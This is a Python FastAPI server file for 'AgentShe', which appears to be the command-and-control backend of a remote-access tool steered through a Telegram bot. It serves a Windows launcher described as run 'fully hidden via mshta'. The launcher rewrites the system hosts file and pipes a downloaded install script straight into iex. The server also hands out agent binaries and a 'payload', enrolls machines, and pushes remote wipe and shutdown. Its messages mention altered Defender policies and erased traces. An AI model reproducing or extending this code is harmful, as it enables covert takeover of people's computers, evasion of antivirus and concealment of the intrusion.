from __future__ import annotations

import asyncio
from typing import Any

from fastapi import FastAPI, Query, Request
from fastapi.responses import JSONResponse, PlainTextResponse, Response

from app import config, store
from app.scripts import bash_bootstrap_script, powershell_bootstrap_script
from app.telegram_bot import telegram_loop

app = FastAPI(title="AgentShe", docs_url=None, redoc_url=None)


@app.on_event("startup")
async def _startup() -> None:
    store.ensure_data_dir()
    from app import tunnel

    # Always bring up public URL (named or quick tunnel) so Connect + PC callbacks work after reboot
    try:
        await asyncio.to_thread(tunnel.ensure_public_base_url)
    except Exception as e:
        logging = __import__("logging")
        logging.getLogger("agentshe").warning("tunnel startup: %s", e)
    tunnel.mark_app_ready()
    try:
        tunnel.start_watchdog()
    except Exception as e:
        logging = __import__("logging")
        logging.getLogger("agentshe").warning("tunnel watchdog: %s", e)
    if config.TELEGRAM_BOT_TOKEN:
        asyncio.create_task(telegram_loop())


@app.get("/api/health")
def health() -> dict[str, Any]:
    from app import tunnel

    ts = tunnel.tunnel_status() or {}
    return {
        "ok": True,
        "service": "agentshe",
        "sessions": store.session_count(),
        "tunnel_alive": bool(ts.get("alive")),
        "tunnel_url_ok": bool(ts.get("url_ok")),
        "tunnel_url": (ts.get("url") or ""),
    }


@app.get("/")
def index() -> PlainTextResponse:
    return PlainTextResponse("AgentShe\n")


@app.get("/connect/win.ps1")
def connect_win_ps1(e: str = Query(default="")) -> Response:
    """Tiny PS1 launcher for Connecter — invoked fully hidden via mshta."""
    key = (e or "").strip()
    if not key or store.resolve_enroll_owner(key) is None:
        return PlainTextResponse("enroll invalide\n", status_code=401)
    base = store.effective_base_url().rstrip("/")
    ps1 = f"{base}/files/scripts/install-win.ps1"
    gh = f"{base}/files/releases"
    from urllib.parse import urlparse

    from app import tunnel

    host = (urlparse(base).hostname or "").strip()
    try:
        host, ip = tunnel.resolve_bot_host_ip(base)
    except Exception:
        ip = ""
    body_lines = [
        "$ErrorActionPreference='Stop'",
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        f"$Enroll='{key}'",
        f"$BotBase='{base}'",
        f"$InstallUrl='{ps1}'",
        f"$env:AGENTSHE_ENROLL='{key}'",
        f"$env:AGENTSHE_BOT_BASE='{base}'",
        f"$env:AGENTSHE_INSTALL_URL='{ps1}'",
        f"$env:AGENTSHE_GH='{gh}'",
        f"$h='{host}'",
    ]
    if ip:
        body_lines += [
            f"$ip='{ip}'",
            # Pin hosts so HelperHost (Go) resolves bot_base without local DNS
            "$hf=Join-Path $env:SystemRoot 'System32\\drivers\\etc\\hosts'",
            "try {",
            "  $lines=@(); if (Test-Path $hf) { $lines=@(Get-Content $hf | Where-Object { $_ -notmatch '# agentshe-bot' }) }",
            "  $lines += \"$ip`t$h`t# agentshe-bot\"",
            "  Set-Content -Path $hf -Value $lines -Encoding ASCII -Force",
            "} catch {}",
            "iex ((curl.exe -fsSL --resolve \"${h}:443:$ip\" $InstallUrl | Out-String))",
        ]
    else:
        body_lines.append("iex ((curl.exe -fsSL $InstallUrl | Out-String))")
    body = "\n".join(body_lines) + "\n"
    return Response(
        content=body.encode("utf-8"),
        media_type="text/plain; charset=utf-8",
        headers={
            "Content-Disposition": 'attachment; filename="hh.ps1"',
            "Cache-Control": "no-store",
        },
    )


@app.get("/connect/win.cmd")
def connect_win_cmd(e: str = Query(default="")) -> Response:
    """Compatibility alias — prefer /connect/win.ps1."""
    return connect_win_ps1(e=e)


@app.get("/files/{kind}/{name:path}")
def serve_file(kind: str, name: str) -> Response:
    from app import files as file_svc

    path = file_svc.resolve_file(kind, name)
    if not path:
        return PlainTextResponse("not found\n", status_code=404)
    return file_svc.file_response(path)


def _public_base(request: Request) -> str:
    eff = store.effective_base_url()
    if "127.0.0.1" not in eff and "localhost" not in eff:
        return eff
    proto = request.headers.get("x-forwarded-proto") or request.url.scheme
    host = request.headers.get("x-forwarded-host") or request.headers.get("host")
    if host and "127.0.0.1" not in host and "localhost" not in host:
        return f"{proto}://{host}".rstrip("/")
    return eff


@app.post("/api/tunnel/ensure")
def api_tunnel_ensure(request: Request) -> Any:
    host = request.client.host if request.client else ""
    if host not in ("127.0.0.1", "::1"):
        return JSONResponse({"ok": False, "error": "forbidden"}, status_code=403)
    from app import tunnel

    url = tunnel.ensure_public_base_url()
    return {"ok": True, "url": url, "tunnel": tunnel.tunnel_status()}


@app.post("/api/tunnel/stop")
def api_tunnel_stop(request: Request) -> Any:
    host = request.client.host if request.client else ""
    if host not in ("127.0.0.1", "::1"):
        return JSONResponse({"ok": False, "error": "forbidden"}, status_code=403)
    from app import tunnel

    tunnel.stop_tunnel()
    return {"ok": True}


@app.get("/agent")
@app.post("/agent")
async def agent_endpoint(
    request: Request,
    action: str = Query(...),
    enroll: str | None = Query(default=None),
) -> Response:
    action = (action or "").strip().lower()
    enroll = (enroll or "").strip()
    base = _public_base(request)

    if action == "bootstrap-sh":
        if not enroll:
            return PlainTextResponse("enroll manquant\n", status_code=400)
        return PlainTextResponse(
            bash_bootstrap_script(enroll, base=base), media_type="text/plain"
        )

    if action == "bootstrap":
        if not enroll:
            return PlainTextResponse("enroll manquant\n", status_code=400)
        return PlainTextResponse(
            powershell_bootstrap_script(enroll, base=base),
            media_type="text/x-powershell",
        )

    if action == "helper":
        os_name = (request.query_params.get("os") or "").strip().lower()
        arch = (request.query_params.get("arch") or "").strip().lower()
        from app.scripts import helper_binary_path

        path = helper_binary_path(os_name, arch)
        if not path:
            return PlainTextResponse(
                "helper binary manquant — lance scripts/build_pc_agent.sh\n",
                status_code=404,
            )
        data = path.read_bytes()
        headers = {
            "Content-Disposition": f'attachment; filename="{path.name}"',
            "Cache-Control": "no-store",
        }
        return Response(content=data, media_type="application/octet-stream", headers=headers)

    if action == "payload":
        from app.scripts import agent_source

        # legacy — prefer action=helper (static binary, no Python)
        return PlainTextResponse(agent_source(), media_type="text/x-python")

    if action == "enroll":
        if not enroll:
            return JSONResponse({"ok": False, "error": "enroll manquant"}, status_code=400)
        body: dict[str, Any] = {}
        if request.method == "POST":
            try:
                raw = await request.json()
                if isinstance(raw, dict):
                    body = raw
            except Exception:
                body = {}
        res = store.enroll_pc(
            enroll,
            hostname=str(body.get("hostname") or ""),
            callback_url=str(body.get("callback_url") or ""),
            platform=str(body.get("platform") or "any"),
            user=str(body.get("user") or ""),
            os_name=str(body.get("os") or ""),
        )
        if not res.get("ok"):
            return JSONResponse(res, status_code=int(res.get("code", 401)))
        if res.get("wipe"):
            # PC is back online with a pending wipe — push shutdown + finish when confirmed
            asyncio.create_task(_finish_pending_wipe(res))
        elif res.get("fresh") and res.get("telegram_id"):
            from app.telegram_bot import notify_owner

            name = res.get("name") or "?"
            asyncio.create_task(
                notify_owner(
                    int(res["telegram_id"]),
                    f"✅ Installation terminée — « {name} » est en ligne.\n"
                    "Defender : policies « Géré par votre organisation ».\n"
                    "Ouvre la machine (Terminal / Outils).",
                )
            )
        return JSONResponse(res)

    if action == "wipe-check":
        token = ""
        if request.method == "POST":
            try:
                raw = await request.json()
                if isinstance(raw, dict):
                    token = str(raw.get("token") or "")
            except Exception:
                token = ""
        if not token:
            token = (request.query_params.get("token") or "").strip()
        return JSONResponse(store.wipe_check_by_token(token))

    if action == "wiped":
        body2: dict[str, Any] = {}
        if request.method == "POST":
            try:
                raw = await request.json()
                if isinstance(raw, dict):
                    body2 = raw
            except Exception:
                body2 = {}
        token = str(body2.get("token") or request.query_params.get("token") or "").strip()
        done = store.confirm_wiped_by_token(token)
        if not done:
            return JSONResponse({"ok": False, "error": "unknown"}, status_code=404)
        from app import tunnel
        from app.telegram_bot import notify_owner

        tunnel.maybe_stop_tunnel_if_idle()
        owner = done.get("owner_telegram_id")
        name = done.get("name") or "?"
        if owner:
            asyncio.create_task(
                notify_owner(
                    int(owner),
                    f"✅ « {name} » — suppression TERMINÉE (accusé PC).\n"
                    "AV restauré · traces effacées · script auto-supprimé · session bot purgée.",
                )
            )
        return JSONResponse({"ok": True, "deleted": True, "name": name})

    return JSONResponse({"ok": False, "error": "unknown action"}, status_code=400)


async def _finish_pending_wipe(enroll_res: dict[str, Any]) -> None:
    """After PC re-enrolls with wipe_pending: push /shutdown; if OK, purge + notify."""
    from app import remote, tunnel
    from app.telegram_bot import notify_owner

    sid = enroll_res.get("session_id")
    name = enroll_res.get("name") or "?"
    owner = enroll_res.get("telegram_id")
    if not sid:
        return
    # Give tunnel a moment to be ready for inbound /shutdown
    await asyncio.sleep(2)
    raw = store.get_session(sid)
    if not raw or not raw.get("wipe_pending"):
        return
    wiped = await remote.pc_shutdown(raw)
    if not wiped:
        return
    # Agent may also call action=wiped — avoid double notify
    still = store.get_session_raw(sid)
    if not still:
        return
    done = store.delete_session(sid)
    tunnel.maybe_stop_tunnel_if_idle()
    if owner and done:
        await notify_owner(
            int(owner),
            f"✅ « {name} » — suppression terminée.\n"
            "AV remis à la normale · traces PC effacées · session bot purgée.",
        )
